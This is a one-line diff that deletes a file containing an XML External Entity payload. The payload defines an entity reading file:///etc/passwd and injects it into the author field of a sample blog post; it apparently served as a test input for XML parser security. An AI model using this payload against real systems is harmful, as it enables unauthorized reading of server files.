@@ -1,1 +1,0 @@
-<!DOCTYPE foo [ <!ELEMENT xxe ANY> <!ENTITY xxe SYSTEM "file:///etc/passwd">]><Blogs><blog><title>hey</title> <body>hey all</body><author>woh&xxe;</author></blog></Blogs>
